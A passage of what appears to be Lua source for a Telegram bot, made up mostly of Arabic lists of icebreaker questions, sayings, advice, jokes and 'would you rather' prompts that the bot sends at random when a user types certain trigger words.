"صفة يطلقها عليك الشخص المفضّل؟ ", 
"أغنية عالقة في ذهنك هاليومين؟ ", 
"أكلة مستحيل أن تأكلها؟ ", 
"كيف قضيت نهارك؟ ", 
"تصرُّف ماتتحمله؟ ", 
"موقف غير حياتك؟ ", 
"اكثر مشروب تحبه؟ ", 
"القصيدة اللي تأثر فيك؟ ", 
"متى يصبح الصديق غريب ", 
"وين نلقى السعاده برايك؟ ", 
"تاريخ ميلادك؟ ", 
"قهوه و لا شاي؟ ", 
"من محبّين الليل أو الصبح؟ ", 
"حيوانك المفضل؟ ", 
"كلمة غريبة ومعناها؟ ", 
"كم تحتاج من وقت لتثق بشخص؟ ", 
"اشياء نفسك تجربها؟ ", 
"يومك ضاع على؟ ", 
"كل شيء يهون الا ؟ ", 
"اسم ماتحبه ؟ ", 
"وقفة إحترام للي إخترع ؟ ", 
"أقدم شيء محتفظ فيه من صغرك؟ ", 
"كلمات ماتستغني عنها بسوالفك؟ ", 
"وش الحب بنظرك؟ ", 
"حب التملك في شخصِيـتك ولا ؟ ", 
"تخطط للمستقبل ولا ؟ ", 
"موقف محرج ماتنساه ؟ ", 
"من طلاسم لهجتكم ؟ ", 
"اعترف باي حاجه ؟ ", 
"عبّر عن مودك بصوره ؟ ",
"آخر مره ضربت عشره كانت متى ؟", 
"اسم دايم ع بالك ؟ ", 
"اشياء تفتخر انك م سويتها ؟ ", 
" لو بكيفي كان ؟ ", 
  "أكثر جملة أثرت بك في حياتك؟ ",
  "إيموجي يوصف مزاجك حاليًا؟ ",
  "أجمل اسم بنت بحرف الباء؟ ",
  "كيف هي أحوال قلبك؟ ",
  "أجمل مدينة؟ ",
  "كيف كان أسبوعك؟ ",
  "شيء تشوفه اكثر من اهلك ؟ ",
  "اخر مره فضفضت؟ ",
  "قد كرهت احد بسبب اسلوبه؟ ",
  "قد حبيت شخص وخذلك؟ ",
  "كم مره حبيت؟ ",
  "اكبر غلطة بعمرك؟ ",
  "نسبة النعاس عندك حاليًا؟ ",
  "شرايكم بمشاهير التيك توك؟ ",
  "ما الحاسة التي تريد إضافتها للحواس الخمسة؟ ",
  "اسم قريب لقلبك؟ ",
  "مشتاق لمطعم كنت تزوره قبل الحظر؟ ",
  "أول شيء يخطر في بالك إذا سمعت كلمة (ابوي يبيك)؟ ",
  "ما أول مشروع تتوقع أن تقوم بإنشائه إذا أصبحت مليونير؟ ",
  "أغنية عالقة في ذهنك هاليومين؟ ",
  "متى اخر مره قريت قرآن؟ ",
  "كم صلاة فاتتك اليوم؟ ",
  "تفضل التيكن او السنقل؟ ",
  "وش أفضل بوت برأيك؟ ",
"كم لك بالتلي؟ ",
"وش الي تفكر فيه الحين؟ ",
"كيف تشوف الجيل ذا؟ ",
"منشن شخص وقوله، تحبني؟ ",
"لو جاء شخص وعترف لك كيف ترده؟ ",
"مر عليك موقف محرج؟ ",
"وين تشوف نفسك بعد سنتين؟ ",
"لو فزعت/ي لصديق/ه وقالك مالك دخل وش بتسوي/ين؟ ",
"وش اجمل لهجة تشوفها؟ ",
"قد سافرت؟ ",
"افضل مسلسل عندك؟ ",
"افضل فلم عندك؟ ",
"مين اكثر يخون البنات/العيال؟ ",
"متى حبيت؟ ",
  "بالعادة متى تنام؟ ",
  "شيء من صغرك ماتغير فيك؟ ",
  "شيء بسيط قادر يعدل مزاجك بشكل سريع؟ ",
  "تشوف الغيره انانيه او حب؟ ",
"حاجة تشوف نفسك مبدع فيها؟ ",
  "مع او ضد : يسقط جمال المراة بسبب قبح لسانها؟ ",
  "عمرك بكيت على شخص مات في مسلسل ؟ ",
  "‏- هل تعتقد أن هنالك من يراقبك بشغف؟ ",
  "تدوس على قلبك او كرامتك؟ ",
  "اكثر لونين تحبهم مع بعض؟ ",
  "مع او ضد : النوم افضل حل لـ مشاكل الحياة؟ ",
  "سؤال دايم تتهرب من الاجابة عليه؟ ",
  "تحبني ولاتحب الفلوس؟ ",
  "العلاقه السريه دايماً تكون حلوه؟ ",
  "لو أغمضت عينيك الآن فما هو أول شيء ستفكر به؟ ",
"كيف ينطق الطفل اسمك؟ ",
  "ما هي نقاط الضعف في شخصيتك؟ ",
  "اكثر كذبة تقولها؟ ",
  "تيكن ولا اضبطك؟ ",
  "اطول علاقة كنت فيها مع شخص؟ ",
  "قد ندمت على شخص؟ ",
  "وقت فراغك وش تسوي؟ ",
  "عندك أصحاب كثير؟ ولا ينعد بالأصابع؟ ",
  "حاط نغمة خاصة لأي شخص؟ ",
  "وش اسم شهرتك؟ ",
  "أفضل أكلة تحبه لك؟ ",
"عندك شخص تسميه ثالث والدينك؟ ",
  "عندك شخص تسميه ثالث والدينك؟ ",
  "اذا قالو لك تسافر أي مكان تبيه وتاخذ معك شخص واحد وين بتروح ومين تختار؟ ",
  "أطول مكالمة كم ساعة؟ ",
  "تحب الحياة الإلكترونية ولا الواقعية؟ ",
  "كيف حال قلبك ؟ بخير ولا مكسور؟ ",
  "أطول مدة نمت فيها كم ساعة؟ ",
  "تقدر تسيطر على ضحكتك؟ ",
  "أول حرف من اسم الحب؟ ",
  "تحب تحافظ على الذكريات ولا تمسحه؟ ",
  "اسم اخر شخص زعلك؟ ",
"وش نوع الأفلام اللي تحب تتابعه؟ ",
  "أنت انسان غامض ولا الكل يعرف عنك؟ ",
  "لو الجنسية حسب ملامحك وش بتكون جنسيتك؟ ",
  "عندك أخوان او خوات من الرضاعة؟ ",
  "إختصار تحبه؟ ",
  "إسم شخص وتحس أنه كيف؟ ",
  "وش الإسم اللي دايم تحطه بالبرامج؟ ",
  "وش برجك؟ ",
  "لو يجي عيد ميلادك تتوقع يجيك هدية؟ ",
  "اجمل هدية جاتك وش هو؟ ",
  "الصداقة ولا الحب؟ ",
"الصداقة ولا الحب؟ ",
  "الغيرة الزائدة شك؟ ولا فرط الحب؟ ",
  "قد حبيت شخصين مع بعض؟ وانقفطت؟ ",
  "وش أخر شي ضيعته؟ ",
  "قد ضيعت شي ودورته ولقيته بيدك؟ ",
  "تؤمن بمقولة اللي يبيك مايحتار فيك؟ ",
  "سبب وجوك بالتليجرام؟ ",
  "تراقب شخص حاليا؟ ",
  "عندك معجبين ولا محد درا عنك؟ ",
  "لو نسبة جمالك بتكون بعدد شحن جوالك كم بتكون؟ ",
  "أنت محبوب بين الناس؟ ولاكريه؟ ",
"كم عمرك؟ ",
  "لو يسألونك وش اسم امك تجاوبهم ولا تسفل فيهم؟ ",
  "تؤمن بمقولة الصحبة تغنيك الحب؟ ",
  "وش مشروبك المفضل؟ ",
  "قد جربت الدخان بحياتك؟ وانقفطت ولا؟ ",
  "أفضل وقت للسفر؟ الليل ولا النهار؟ ",
  "انت من النوع اللي تنام بخط السفر؟ ",
  "عندك حس فكاهي ولا نفسية؟ ",
  "تبادل الكراهية بالكراهية؟ ولا تحرجه بالطيب؟ ",
  "أفضل ممارسة بالنسبة لك؟ ",
  "لو قالو لك تتخلى عن شي واحد تحبه بحياتك وش يكون؟ ",
"لو احد تركك وبعد فتره يحاول يرجعك بترجع له ولا خلاص؟ ",
  "برأيك كم العمر المناسب للزواج؟ ",
  "اذا تزوجت بعد كم بتخلف عيال؟ ",
  "فكرت وش تسمي أول اطفالك؟ ",
  "من الناس اللي تحب الهدوء ولا الإزعاج؟ ",
  "الشيلات ولا الأغاني؟ ",
  "عندكم شخص مطوع بالعايلة؟ ",
  "تتقبل النصيحة من اي شخص؟ ",
  "اذا غلطت وعرفت انك غلطان تحب تعترف ولا تجحد؟ ",
  "جربت شعور احد يحبك بس انت مو قادر تحبه؟ ",
  "دايم قوة الصداقة تكون بإيش؟ ",
"أفضل البدايات بالعلاقة بـ وش؟ ",
  "وش مشروبك المفضل؟ او قهوتك المفضلة؟ ",
  "تحب تتسوق عبر الانترنت ولا الواقع؟ ",
  "انت من الناس اللي بعد ماتشتري شي وتروح ترجعه؟ ",
  "أخر مرة بكيت متى؟ وليش؟ ",
  "عندك الشخص اللي يقلب الدنيا عشان زعلك؟ ",
  "أفضل صفة تحبه بنفسك؟ ",
  "كلمة تقولها للوالدين؟ ",
  "أنت من الناس اللي تنتقم وترد الاذى ولا تحتسب الأجر وتسامح؟ ",
  "كم عدد سنينك بالتليجرام؟ ",
  "تحب تعترف ولا تخبي؟ ",
"انت من الناس الكتومة ولا تفضفض؟ ",
  "أنت بعلاقة حب الحين؟ ",
  "عندك اصدقاء غير جنسك؟ ",
  "أغلب وقتك تكون وين؟ ",
  "لو المقصود يقرأ وش بتكتب له؟ ",
  "تحب تعبر بالكتابة ولا بالصوت؟ ",
  "عمرك كلمت فويس احد غير جنسك؟ ",
  "لو خيروك تصير مليونير ولا تتزوج الشخص اللي تحبه؟ ",
  "لو عندك فلوس وش السيارة اللي بتشتريها؟ ",
  "كم أعلى مبلغ جمعته؟ ",
  "اذا شفت احد على غلط تعلمه الصح ولا تخليه بكيفه؟ ",
"قد جربت تبكي فرح؟ وليش؟ ",
  "تتوقع إنك بتتزوج اللي تحبه؟ ",
  "ما هو أمنيتك؟ ",
  "وين تشوف نفسك بعد خمس سنوات؟ ",
  "هل انت حرامي تويت بتعت باندا؟ ",
  "لو خيروك تقدم الزمن ولا ترجعه ورا؟ ",
  "لعبة قضيت وقتك فيه بالحجر المنزلي؟ ",
  "تحب تطق الميانة ولا ثقيل؟ ",
  "باقي معاك للي وعدك ما بيتركك؟ ",
  "اول ماتصحى من النوم مين تكلمه؟ ",
  "عندك الشخص اللي يكتب لك كلام كثير وانت نايم؟ ",
  "قد قابلت شخص تحبه؟ وولد ولا بنت؟ ",
   "هل انت تحب باندا؟ ",
"اذا قفطت احد تحب تفضحه ولا تستره؟ ",
  "كلمة للشخص اللي يسب ويسطر؟ ",
  "آية من القران تؤمن فيه؟ ",
  "تحب تعامل الناس بنفس المعاملة؟ ولا تكون أطيب منهم؟ ",
"حاجة ودك تغيرها هالفترة؟ ",
  "كم فلوسك حاليا وهل يكفيك ام لا؟ ",
  "وش لون عيونك الجميلة؟ ",
  "من الناس اللي تتغزل بالكل ولا بالشخص اللي تحبه بس؟ ",
  "اذكر موقف ماتنساه بعمرك؟ ",
  "وش حاب تقول للاشخاص اللي بيدخل حياتك؟ ",
  "ألطف شخص مر عليك بحياتك؟ ",
   "هل باندا لطيف؟ ",
"انت من الناس المؤدبة ولا نص نص؟ ",
  "كيف الصيد معاك هالأيام ؟ وسنارة ولاشبك؟ ",
  "لو الشخص اللي تحبه قال بدخل حساباتك بتعطيه ولا تكرشه؟ ",
  "أكثر شي تخاف منه بالحياه وش؟ ",
  "اكثر المتابعين عندك باي برنامج؟ ",
  "متى يوم ميلادك؟ ووش الهدية اللي نفسك فيه؟ ",
  "قد تمنيت شي وتحقق؟ ",
  "قلبي على قلبك مهما صار لمين تقولها؟ ",
  "وش نوع جوالك؟ واذا بتغيره وش بتأخذ؟ ",
  "كم حساب عندك بالتليجرام؟ ",
  "متى اخر مرة كذبت؟ ",
"كذبت في الاسئلة اللي مرت عليك قبل شوي؟ ",
  "تجامل الناس ولا اللي بقلبك على لسانك؟ ",
  "قد تمصلحت مع أحد وليش؟ ",
  "وين تعرفت على الشخص اللي حبيته؟ ",
  "قد رقمت او احد رقمك؟ ",
  "وش أفضل لعبته بحياتك؟ ",
  "أخر شي اكلته وش هو؟ ",
  "حزنك يبان بملامحك ولا صوتك؟ ",
  "لقيت الشخص اللي يفهمك واللي يقرا افكارك؟ ",
  "فيه شيء م تقدر تسيطر عليه ؟ ",
  "منشن شخص متحلطم م يعجبه شيء؟ ",
"اكتب تاريخ مستحيل تنساه ",
  "شيء مستحيل انك تاكله ؟ ",
  "تحب تتعرف على ناس جدد ولا مكتفي باللي عندك ؟ ",
  "انسان م تحب تتعامل معاه ابداً ؟ ",
  "شيء بسيط تحتفظ فيه؟ ",
  "فُرصه تتمنى لو أُتيحت لك ؟ ",
   "لي باندا ناك اليكس؟ ",
  "شيء مستحيل ترفضه ؟. ",
  "لو زعلت بقوة وش بيرضيك ؟ ",
  "تنام بـ اي مكان ، ولا بس غرفتك ؟ ",
  "ردك المعتاد اذا أحد ناداك ؟ ",
  "مين الي تحب يكون مبتسم دائما ؟ ",
" إحساسك في هاللحظة؟ ",
  "وش اسم اول شخص تعرفت عليه فالتلقرام ؟ ",
  "اشياء صعب تتقبلها بسرعه ؟ ",
  "شيء جميل صار لك اليوم ؟ ",
  "اذا شفت شخص يتنمر على شخص قدامك شتسوي؟ ",
  "يهمك ملابسك تكون ماركة ؟ ",
  "ردّك على شخص قال (أنا بطلع من حياتك)؟. ",
  "مين اول شخص تكلمه اذا طحت بـ مصيبة ؟ ",
  "تشارك كل شي لاهلك ولا فيه أشياء ما تتشارك؟ ",
  "كيف علاقتك مع اهلك؟ رسميات ولا ميانة؟ ",
  "عمرك ضحيت باشياء لاجل شخص م يسوى ؟ ",
"اكتب سطر من اغنية او قصيدة جا فـ بالك ؟ ",
  "شيء مهما حطيت فيه فلوس بتكون مبسوط ؟ ",
  "مشاكلك بسبب ؟ ",
  "نسبه الندم عندك للي وثقت فيهم ؟ ",
  "اول حرف من اسم شخص تقوله? بطل تفكر فيني ابي انام؟ ",
  "اكثر شيء تحس انه مات ف مجتمعنا؟ ",
  "لو صار سوء فهم بينك وبين شخص هل تحب توضحه ولا تخليه كذا  لان مالك خلق توضح ؟ ",
  "كم عددكم بالبيت؟ ",
  "عادي تتزوج من برا القبيلة؟ ",
  "أجمل شي بحياتك وش هو؟ ",
} 
send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
return false 
end
if text == "كتبات" or text == "حكمه" or text == "قصيده" then 
local TWEET_Msg = { 
"‏من ترك أمرهُ لله، أعطاه الله فوق ما يتمنَّاه💙 ", 
"‏من علامات جمال المرأة .. بختها المايل ! ",
"‏ انك الجميع و كل من احتل قلبي🫀🤍",
"‏ ‏ لقد تْعَمقتُ بكَ كَثيراً والمِيمُ لام .♥️",
"‏ ‏ممكن اكون اختارت غلط بس والله حبيت بجد🖇️",
"‏ علينا إحياء زَمن الرّسائل الورقيّة وسط هذه الفوضى الالكترونية العَارمة. 𖥔💜",
"‏ يجي اي الصاروخ الصيني ده جمب الصاروخ المصري لما بيلبس العبايه السوده.🤩♥️",
"‏ كُنت أرقّ من أن أتحمّل كُل تلك القَسوة من عَينيك .🍍",
"‏أَكَان عَلَيَّ أَنْ أغْرَس انيابي فِي قَلْبِك لتشعر بِي ؟.",
"‏ : كُلما أتبع قلبي يدلني إليك .",
"‏ : أيا ليت من تَهواه العينُ تلقاهُ .",
"‏ ‏: رغبتي في مُعانقتك عميقة جداً .??",
"ويُرهقني أنّي مليء بما لا أستطيع قوله.✨",
"‏ من مراتب التعاسه إطالة الندم ع شيء إنتهى. 𖥔 ",
"‏ ‏كل العالم يهون بس الدنيا بينا تصفي 💙",
"‏ بعض الاِعتذارات يجب أن تُرفَضّ.",
"‏ ‏تبدأ حياتك محاولاً فهم كل شيء، وتنهيها محاولاً النجاة من كل ما فهمت.",
"‏ إن الأمر ينتهي بِنا إلى أعتياد أي شيء.",
"‏ هل كانت كل الطرق تؤدي إليكِ، أم أنني كنتُ أجعلها كذلك.",
"‏ ‏هَتفضل توآسيهُم وآحد ورآ التآني لكن أنتَ هتتنسي ومحدِش هَيوآسيك.",
"‏ جَبَرَ الله قلوبِكُم ، وقَلبِي .🍫",
"‏ بس لما أنا ببقى فايق، ببقى أبكم له ودان.💖",
"‏ ‏مقدرش عالنسيان ولو طال الزمن 🖤",
"‏ أنا لستُ لأحد ولا احد لي ، أنا إنسان غريب أساعد من يحتاجني واختفي.",
"‏ ‏أحببتك وأنا منطفئ، فما بالك وأنا في كامل توهجي ؟",
"‏ لا تعودني على دفء شمسك، إذا كان في نيتك الغروب .َ",
"‏ وانتهت صداقة الخمس سنوات بموقف.",
"‏ ‏لا تحب أحداً لِدرجة أن تتقبّل أذاه.",
"‏ إنعدام الرّغبة أمام الشّيء الّذي أدمنته ، انتصار.",
"‏مش جايز , ده اكيد التأخير وارهاق القلب ده وراه عوضاً عظيماً !💙 ",
" مش جايز , ده اكيد التأخير وارهاق القلب ده وراه عوضاً عظيماً !💙",
"فـ بالله صبر  وبالله يسر وبالله عون وبالله كل شيئ ♥️. ",
"أنا بعتز بنفسي جداً كصاحب وشايف اللي بيخسرني ، بيخسر أنضف وأجدع شخص ممكن يشوفه . ",
"فجأه جاتلى قافله ‏خلتنى مستعد أخسر أي حد من غير ما أندم عليه . ",
"‏اللهُم قوني بك حين يقِل صبري... ",
"‏يارب سهِل لنا كُل حاجة شايلين هَمها 💙‏ ",
"انا محتاج ايام حلوه بقي عشان مش نافع كدا ! ",
"المشكله مش اني باخد قررات غلط المشكله اني بفكر كويس فيها قبل ما اخدها .. ",
"تخيل وانت قاعد مخنوق كدا بتفكر فالمزاكره اللي مزكرتهاش تلاقي قرار الغاء الدراسه .. ",
" مكانوش يستحقوا المعافرة بأمانه.",
"‏جمل فترة في حياتي، كانت مع اكثر الناس الذين أذتني نفسيًا. ",
" ‏إحنا ليه مبنتحبش يعني فينا اي وحش!",
"أيام مُمله ومستقبل مجهول ونومٌ غير منتظموالأيامُ تمرُ ولا شيَ يتغير ", 
"عندما تهب ريح المصلحه سوف ياتي الجميع رتكدون تحت قدمك ❤️. ",
"عادي مهما تعادي اختك قد الدنيا ف عادي ❤. ",
"بقيت لوحدي بمعنا اي انا اصلا من زمان لوحدي.❤️ ",
"- ‏تجري حياتنا بما لاتشتهي أحلامنا ! ",
"تحملين كل هذا الجمال، ‏ألا تتعبين؟",
"البدايات للكل ، والثبات للصادقين ",
"مُؤخرًا اقتنعت بالجملة دي جدا : Private life always wins. ",
" الافراط في التسامح بيخللي الناس تستهين بيك🍍",
"مهما كنت كويس فـَ إنت معرض لـِ الاستبدال.. ",
"فخوره بنفسي جدًا رغم اني معملتش حاجه فـ حياتي تستحق الذكر والله . ",
"‏إسمها ليلة القدر لأنها تُغير الأقدار ,اللهُمَّ غير قدري لحالٍ تُحبه وعوضني خير .. ",
"فى احتمال كبير انها ليلة القدر ادعوا لنفسكم كتير وأدعو ربنا يشفى كل مريض. 💙 ",
"أنِر ظُلمتي، وامحُ خطيئتي، واقبل توبتي وأعتِق رقبتي يا اللّٰه. إنكَ عفوٌّ تُحِبُّ العفوَ؛ فاعفُ عني 💛 ", 
} 
send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
return false 
end
if text == "انصحني" or text == "انصحنى" or text == "انصح" then 
local TWEET_Msg = { 
"عامل الناس بأخلاقك ولا بأخلاقهم", 
"الجمال يلفت الأنظار لكن الطيبه تلفت القلوب ", 
"الاعتذار عن الأخطاء لا يجرح كرامتك بل يجعلك كبير في نظر الناس ",
"لا ترجي السماحه من بخيل.. فما في البار لظمان ماء",
"لا تحقرون صغيره إن الجبال من الحصي",
"لا تستحي من إعطاء فإن الحرمان أقل منه ", 
"لا تظلم حتى لا تتظلم ",
"لا تقف قصاد الريح ولا تمشي معها ",
"لا تكسب موده التحكم الا بالتعقل",
"لا تمد عينك في يد غيرك ",
"لا تملح الا لمن يستحقاها ويحافظ عليها",
"لا حياه للإنسان بلا نبات",
"لا حياه في الرزق.. ولا شفاعه في الموت",
"كما تدين تدان",
"لا دين لمن لا عهد له ",
"لا سلطان على الدوق فيما يحب أو بكره",
"لا مروه لمن لادين له ",
"لا يدخل الجنه من لايأمن من جازه بوائقه",
"يسروا ولا تعسروا... ويشورا ولا تنفروا",
"يدهم الصدر ما يبني العقل الواسع ",
"أثقل ما يوضع في الميزان يوم القيامة حسن الخلق ",
"أجهل الناس من ترك يقين ما عنده لظن ما عند الناس ",
"أحياناً.. ويصبح الوهم حقيقه ",
"مينفعش تعاتب حد مبيعملش حساب لزعلك عشان متزعلش مرتين . ",
"السفر ومشاهده اماكن مختلفه وجديده ",
"عدم تضيع الفرص واسثمارها لحظه مجبئها ",
" اعطاء الاخرين اكثر من ما يتوقعون",
"معامله الناس بلطف ولكن عدم السماح لاحد بستغالال ذالك ",
"تكوين صدقات جديده مع الحفظ بلاصدقاء القودامي ",
"تعلم اصول المهنه بدلا من تضيع الوقت ف تعلم حيل المهنه ",
"مدح ع الاقل ثلاث اشخاص يوميا ",
"النظر ف عيون الشخاص عند مخاطبتهم ",
"التحلي بلسماح مع الاخرين او النفس ",
"الاكثار من قول كلمه شكرا ",
" مصافحه الاخرين بثبات وقوة ",
"الابتعاد عن المناطق السيئه السمعه لتجنب الاحداث السئه ",
" ادخار 10٪ع الاقل من الدخل",
" تجنب المخاوف من خلال التعلم من تجارب مختلفه",
" الحفاظ ع السمعه لانها اغلي ما يملك الانسان",
" تحويل الاعداء الي اصدقاء من خلال القيام بعمل جيد",
"لا تصدق كل ما تسمعع. ولا تنفق كل ما تمتلك . ولا تنم قدر ما ترغب ",
" اعتني بسمعتك جيدا فستثبت للك الايام انها اغلي ما تملك",
"حين تقول والدتك ستندم ع فعل ذالك ستندم عليه غالبا.. ",
" لا تخش العقبات الكبيره فخلفها تقع الفرص العظيمه",
"قد لا يتطلب الامر اكثر من شخص واحد لقلب حياتك رأس ع عقب ",
"اختر رفيقه حياتك بحرص فهو قرار سيشكل 90٪من سعادتك او بؤسك ",
" اقلب اداءك الاصدقاء بفعل شي جميل ومفجائ لهم",
"حين تدق الفرصه ع باباك ادعوها للبيت ",
"تعلم القواعد جيدا ثن اكسر بعدها ",
"احكم ع نجاحك من خلال قدرتك ع العطاء وليس الاخذ ",
" لا تتجاهل الشيطان مهما بدل ثيابه",
"ركز ع جعل الاشياء افضل وليس اكبر او اعظم ",
"كن سعيد  بما تمتلك واعمل لامتلاك ما تريد ",
"اعط الناس اكثر من ما يتوقعون ",
" لا تكن منشغل لدرجه عدم التعرف ع اصدقاء جدد",
"استحمه يوم العيد يمعفن🤓",
"مش تحب اي حد يقرب منك ",
" خليك مع البت راجل خليك تقيل🥥",
" انصح نفسك بنفسك بمت😆",
" كنت نصحت نفسي ياخويا😹", 
} 
send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
return false 
end
if text == "نكته" or text == "قولي نكته" or text == "عايز اضحك" then 
local TWEET_Msg = { 
" مرة واحد مصري دخل سوبر ماركت في الكويت عشان يشتري ولاعة..    راح عشان يحاسب بيقوله الولاعة ديه بكام؟   قاله دينار..  قاله منا عارف ان هي نار بس بكام 🤓😂", 
"بنت حبت تشتغل مع رئيس عصابة..   شغلها في غسيل الأموال 🤓😂 ", 
"واحد بيشتكي لصاحبه بيقوله أنا مافيش حد بيحبني ولا يفتكرني أبدًا، ومش عارف أعمل إيه.. قاله سهلة.. استلف من الناس فلوس هيسألوا عليك كل يوم! 🤓😂",
"ﻣﺮه واﺣﺪ ﻣﺴﻄﻮل ﻣﺎﺷﻰ ﻓﻰ اﻟﺸﺎرع ﻟﻘﻰ مذﻳﻌﻪ ﺑﺘﻘﻮﻟﻪ ﻟﻮ ﺳﻤﺤﺖ ﻓﻴﻦ اﻟﻘﻤﺮ؟    ﻗﺎﻟﻬﺎ اﻫﻮه..   ﻗﺎﻟﺘﻠﻮ ﻣﺒﺮوك ﻛﺴﺒﺖ ﻋﺸﺮﻳﻦ ﺟﻨﻴﻪ..   ﻗﺎﻟﻬﺎ ﻓﻰ واﺣﺪ ﺗﺎﻧﻰ ﻫﻨﺎك اﻫﻮه. 🤓😂",
"واحده ست سايقه على الجي بي اس..  قالها انحرفي قليلًا..   قلعت الطرحة. 🤓😂 ",
"مرة واحد غبي معاه عربية قديمة جدًا وبيحاول يبيعها وماحدش راضي يشتريها.. راح لصاحبه حكاله المشكلة.. صاحبه قاله عندي لك فكرة جهنمية هاتخليها تتباع الصبح.. أنت تجيب علامة مرسيدس وتحطها عليها. بعد أسبوعين صاحبه شافه صدفة قاله بعت العربية ولا لاء؟ قاله انت  مجنون؟ حد يبيع مرسيدس؟ 🤓😂",
"مره واحد بلديتنا كان بيدق مسمار فى الحائط فالمسمار وقع منه فقال له :تعالى ف مجاش, فقال له: تعالي ف مجاش. فراح بلديتنا رامي على المسمار شوية مسمامير وقال: هاتوه. 🤓😂",
"واحدة عملت حساب وهمي ودخلت تكلم جوزها منه.. ومبسوطة أوي وبتضحك.. سألوها بتضحكي على إيه؟ قالت لهم أول مرة يقول لي كلام حلو من ساعة ما اتجوزنا. 🤓😂",
"بنت حبت تشتغل مع رئيس عصابة..   شغلها في غسيل الأموال 🤓😂",
"مره واحد اشترى فراخ..   علشان يربيها فى قفص صدره.🤓😂",
"مرة واحد من الفيوم مات..   أهله صوصوا عليه.🤓😂",
"ﻣﺮه واﺣﺪ ﻣﺴﻄﻮل ﻣﺎﺷﻰ ﻓﻰ اﻟﺸﺎرع ﻟﻘﻰ مذﻳﻌﻪ ﺑﺘﻘﻮﻟﻪ ﻟﻮ ﺳﻤﺤﺖ ﻓﻴﻦ اﻟﻘﻤﺮ؟    ﻗﺎﻟﻬﺎ اﻫﻮه..   ﻗﺎﻟﺘﻠﻮ ﻣﺒﺮوك ﻛﺴﺒﺖ ﻋﺸﺮﻳﻦ ﺟﻨﻴﻪ..   ﻗﺎﻟﻬﺎ ﻓﻰ واﺣﺪ ﺗﺎﻧﻰ ﻫﻨﺎك اﻫﻮه.🤓😂",
"مره واحد شاط كرة فى المقص..   اتخرمت. 🤓😂",
"مرة واحد رايح لواحد صاحبه.. فا البواب وقفه بيقول له انت طالع لمين.. قاله طالع أسمر شوية لبابايا.. قاله يا أستاذ طالع لمين في العماره 🤓😂",
} 
send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
return false 
end
if text == "خيرني" or text == "لو خيروك" or text == "خيروك" then 
local TWEET_Msg = { 
"لو خيروك |  بين الإبحار لمدة أسبوع كامل أو السفر على متن طائرة لـ 3 أيام متواصلة؟ ",
"لو خيروك |  بين شراء منزل صغير أو استئجار فيلا كبيرة بمبلغ معقول؟ ",
"لو خيروك |  أن تعيش قصة فيلم هل تختار الأكشن أو الكوميديا؟ ",
"لو خيروك |  بين تناول البيتزا وبين الآيس كريم وذلك بشكل دائم؟ ",
"لو خيروك |  بين إمكانية تواجدك في الفضاء وبين إمكانية تواجدك في البحر؟ ",
"لو خيروك |  بين تغيير وظيفتك كل سنة أو البقاء بوظيفة واحدة طوال حياتك؟ ",
"لو خيروك |  أسئلة محرجة أسئلة صراحة ماذا ستختار؟ ",
"لو خيروك |  بين الذهاب إلى الماضي والعيش مع جدك أو بين الذهاب إلى المستقبل والعيش مع أحفادك؟ ",
"لو كنت شخص آخر هل تفضل البقاء معك أم أنك ستبتعد عن نفسك؟ ",
"لو خيروك |  بين الحصول على الأموال في عيد ميلادك أو على الهدايا؟ ",
"لو خيروك |  بين القفز بمظلة من طائرة أو الغوص في أعماق البحر؟ ",
"لو خيروك |  بين الاستماع إلى الأخبار الجيدة أولًا أو الاستماع إلى الأخبار السيئة أولًا؟ ",
"لو خيروك |  بين أن تكون رئيس لشركة فاشلة أو أن تكون موظف في شركة ناجحة؟ ",
"لو خيروك |  بين أن يكون لديك جيران صاخبون أو أن يكون لديك جيران فضوليون؟ ",
"لو خيروك |  بين أن تكون شخص مشغول دائمًا أو أن تكون شخص يشعر بالملل دائمًا؟ ",
"لو خيروك |  بين قضاء يوم كامل مع الرياضي الذي تشجعه أو نجم السينما الذي تحبه؟ ",
"لو خيروك |  بين استمرار فصل الشتاء دائمًا أو بقاء فصل الصيف؟ ",
"لو خيروك |  بين العيش في القارة القطبية أو العيش في الصحراء؟ ",
"لو خيروك |  بين أن تكون لديك القدرة على حفظ كل ما تسمع أو تقوله وبين القدرة على حفظ كل ما تراه أمامك؟ ",
"لو خيروك |  بين أن يكون طولك 150 سنتي متر أو أن يكون 190 سنتي متر؟ ",
"لو خيروك |  بين إلغاء رحلتك تمامًا أو بقائها ولكن فقدان الأمتعة والأشياء الخاص بك خلالها؟ ",
"لو خيروك |  بين أن تكون اللاعب الأفضل في فريق كرة فاشل أو أن تكون لاعب عادي في فريق كرة ناجح؟ ",
"لو خيروك |  بين ارتداء ملابس البيت لمدة أسبوع كامل أو ارتداء البدلة الرسمية لنفس المدة؟ ",
"لو خيروك |  بين امتلاك أفضل وأجمل منزل ولكن في حي سيء أو امتلاك أسوأ منزل ولكن في حي جيد وجميل؟ ",
"لو خيروك |  بين أن تكون غني وتعيش قبل 500 سنة، أو أن تكون فقير وتعيش في عصرنا الحالي؟ ",
"لو خيروك |  بين ارتداء ملابس الغوص ليوم كامل والذهاب إلى العمل أو ارتداء ملابس جدك/جدتك؟ ",
"لو خيروك |  بين قص شعرك بشكل قصير جدًا أو صبغه باللون الوردي؟ ",
"لو خيروك |  بين أن تضع الكثير من الملح على كل الطعام بدون علم أحد، أو أن تقوم بتناول شطيرة معجون أسنان؟ ",
"لو خيروك |  بين قول الحقيقة والصراحة الكاملة مدة 24 ساعة أو الكذب بشكل كامل مدة 3 أيام؟ ",
"لو خيروك |  بين تناول الشوكولا التي تفضلها لكن مع إضافة رشة من الملح والقليل من عصير الليمون إليها أو تناول ليمونة كاملة كبيرة الحجم؟ ",
"لو خيروك |  بين وضع أحمر الشفاه على وجهك ما عدا شفتين أو وضع ماسكارا على شفتين فقط؟ ",
"لو خيروك |  بين الرقص على سطح منزلك أو الغناء على نافذتك؟ ",
"لو خيروك |  بين تلوين شعرك كل خصلة بلون وبين ارتداء ملابس غير متناسقة لمدة أسبوع؟ ",
"لو خيروك |  بين تناول مياه غازية مجمدة وبين تناولها ساخنة؟ ",
"لو خيروك |  بين تنظيف شعرك بسائل غسيل الأطباق وبين استخدام كريم الأساس لغسيل الأطباق؟ ",
"لو خيروك |  بين تزيين طبق السلطة بالبرتقال وبين إضافة البطاطا لطبق الفاكهة؟ ",
